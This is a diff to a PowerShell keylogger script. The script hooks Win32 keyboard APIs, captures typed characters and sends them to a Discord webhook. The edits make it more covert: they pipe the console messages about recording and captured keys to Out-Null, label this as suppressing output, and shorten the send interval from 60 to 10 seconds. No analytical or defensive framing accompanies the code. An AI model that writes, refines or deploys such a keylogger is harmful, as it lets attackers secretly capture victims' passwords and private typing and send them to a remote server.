@@ -13,7 +13,7 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
+  # Load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
   # Discord webhook URL
@@ -25,9 +25,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $wc.Headers.Add('Content-Type','application/json')
     $wc.Encoding = [System.Text.Encoding]::UTF8
     try {
-        $wc.UploadString($dc, (ConvertTo-Json @{content=$message}))
+        $wc.UploadString($dc, (ConvertTo-Json @{content=$message})) | Out-Null
     } catch {
-        Write-Host "Failed to send data to Discord. Error: $_"
+        Write-Host "Failed to send data to Discord. Error: $_" | Out-Null
     }
   }
 
@@ -36,7 +36,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
-    Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red
+    # Suppress console output
+    Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red | Out-Null
 
     # Send debug message to Discord indicating script has started
     Send-Discord "Keylogger script started at $(Get-Date)"
@@ -49,7 +50,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         # Get current key state
         $state = $API::GetAsyncKeyState($ascii)
 
-        # is key pressed?
+        # Is key pressed?
         if ($state -eq -32767) {
           $null = [console]::CapsLock
 
@@ -67,14 +68,15 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
           if ($success -and ([char]::IsLetterOrDigit($mychar.ToString()) -or [char]::IsPunctuation($mychar.ToString()) -or [char]::IsWhiteSpace($mychar.ToString()))) {
-            Write-Host "Captured: $($mychar.ToString())"
+            # Suppress debug output
+            Write-Host "Captured: $($mychar.ToString())" | Out-Null
             $log += $mychar.ToString()
           }
         }
       }
 
       # Check if 10 seconds have passed
-      if ($timer.Elapsed.TotalSeconds -ge 60) {
+      if ($timer.Elapsed.TotalSeconds -ge 10) {
         if ($log -ne "") {
           Send-Discord "$(Get-Date): Keys logged - $log"
           $log = ""
@@ -89,7 +91,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     if ($log -ne "") {
       Send-Discord "$(Get-Date): Final keys logged - $log"
     }
-    Write-Host "Keylogger stopped."
+    Write-Host "Keylogger stopped." | Out-Null
   }
 }
 
